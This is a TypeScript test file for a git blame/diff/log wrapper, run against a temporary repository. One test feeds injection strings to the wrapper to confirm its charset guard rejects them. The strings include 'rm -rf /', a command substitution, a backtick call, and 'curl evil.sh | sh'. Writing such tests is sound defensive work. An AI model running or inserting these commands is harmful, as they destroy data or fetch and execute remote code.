/**
 * Real git tests: build a throwaway 2-commit repo in a tmp dir (like verification-gate/demo.ts) and
 * drive GitBlameLog against it. No network, no mocks — the point is that real git output parses.
 */

import { test, expect, beforeAll, afterAll } from 'bun:test'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { GitBlameLog, deployToShaRange } from './src/index'

function git(repo: string, ...args: string[]) {
  execFileSync('git', ['-C', repo, ...args], { stdio: 'ignore' })
}
function rev(repo: string, ref = 'HEAD') {
  return execFileSync('git', ['-C', repo, 'rev-parse', ref], { encoding: 'utf8' }).trim()
}

let repo: string
let parent: string
let fix: string
let tool: GitBlameLog

beforeAll(() => {
  repo = mkdtempSync(join(tmpdir(), 'rcagit-test-'))
  git(repo, 'init', '-q')
  git(repo, 'config', 'user.email', 'demo@x.dev')
  git(repo, 'config', 'user.name', 'Demo Dev')
  git(repo, 'config', 'commit.gpgsign', 'false')

  // Parent: buggy add (subtracts).
  writeFileSync(join(repo, 'calc.js'), 'export const add = (a, b) => a - b\n')
  git(repo, 'add', '-A')
  git(repo, 'commit', '-qm', 'parent: buggy add')
  parent = rev(repo)

  // Fix: correct add + a second line, so the diff touches calc.js.
  writeFileSync(join(repo, 'calc.js'), 'export const add = (a, b) => a + b\nexport const sub = (a, b) => a - b\n')
  git(repo, 'add', '-A')
  git(repo, 'commit', '-qm', 'fix: correct add')
  fix = rev(repo)

  tool = new GitBlameLog({ repo })
})

afterAll(() => {
  rmSync(repo, { recursive: true, force: true })
})

test('diff of the range returns the changed file with its first hunk header', () => {
  const entries = tool.diff({ shaRange: `${parent}..${fix}` })
  expect(entries).toEqual([{ path: 'calc.js', hunk: expect.stringMatching(/^@@ /) }])
})

test('blame returns the fix commit and author for the changed lines', () => {
  const rows = tool.blame({ path: 'calc.js' })
  expect(rows.length).toBe(2) // both lines authored by the fix commit
  expect(rows[0]!.sha).toBe(fix)
  expect(rows[0]!.author).toBe('Demo Dev')
  // ts is a real ISO-8601 instant that Date can parse.
  expect(Number.isNaN(Date.parse(rows[0]!.ts))).toBe(false)
})

test('blame honors an -L line range', () => {
  const rows = tool.blame({ path: 'calc.js', range: [2, 2] })
  expect(rows.length).toBe(1)
  expect(rows[0]!.sha).toBe(fix)
})

test('log returns full history newest-first', () => {
  const rows = tool.log({ path: 'calc.js' })
  expect(rows.map((r) => r.sha)).toEqual([fix, parent])
  expect(rows[0]!.summary).toBe('fix: correct add')
  expect(rows[1]!.summary).toBe('parent: buggy add')
  expect(Number.isNaN(Date.parse(rows[0]!.ts))).toBe(false)
})

test('log --since and --follow are wired through and accepted', () => {
  // A since far in the past keeps all history; --follow is a valid flag for a single-path log.
  expect(tool.log({ path: 'calc.js', follow: true, since: '2000-01-01' }).length).toBe(2)
  // Anchor a since strictly AFTER the fix commit's own timestamp → git excludes both commits.
  const fixTs = tool.log({ path: 'calc.js' })[0]!.ts
  const afterFix = new Date(Date.parse(fixTs) + 1000).toISOString()
  expect(tool.log({ path: 'calc.js', since: afterFix })).toEqual([])
})

test('malformed / injection shaRange is rejected by the charset guard and NOT executed', () => {
  // Shell metacharacters would be catastrophic if this ever hit a shell — it must never run.
  expect(tool.diff({ shaRange: `${parent}..${fix}; rm -rf /` })).toEqual([])
  expect(tool.diff({ shaRange: '$(touch /tmp/pwned)' })).toEqual([])
  expect(tool.diff({ shaRange: 'a..b && curl evil.sh | sh' })).toEqual([])
  expect(tool.diff({ shaRange: '`id`' })).toEqual([])
})

test('a well-formed but nonexistent range returns [] (git errors → [], never throws)', () => {
  expect(tool.diff({ shaRange: 'deadbeef..cafebabe' })).toEqual([])
  expect(tool.blame({ path: 'does-not-exist.js' })).toEqual([])
  expect(tool.log({ path: 'does-not-exist.js' })).toEqual([])
})

test('a bad repo path never throws — every method returns []', () => {
  const broken = new GitBlameLog({ repo: '/no/such/repo/here' })
  expect(broken.diff({ shaRange: 'a..b' })).toEqual([])
  expect(broken.blame({ path: 'x.js' })).toEqual([])
  expect(broken.log({ path: 'x.js' })).toEqual([])
})

test('deployToShaRange: passes a bare range through, extracts from a compare URL, falls back to id', () => {
  expect(deployToShaRange({ deploy_id: 'dpl_1', diff_url: 'abc..def' })).toBe('abc..def')
  expect(
    deployToShaRange({ deploy_id: 'dpl_1', diff_url: 'https://github.com/o/r/compare/abc123...def456' }),
  ).toBe('abc123...def456')
  expect(deployToShaRange({ deploy_id: 'sha1..sha2' })).toBe('sha1..sha2')
})
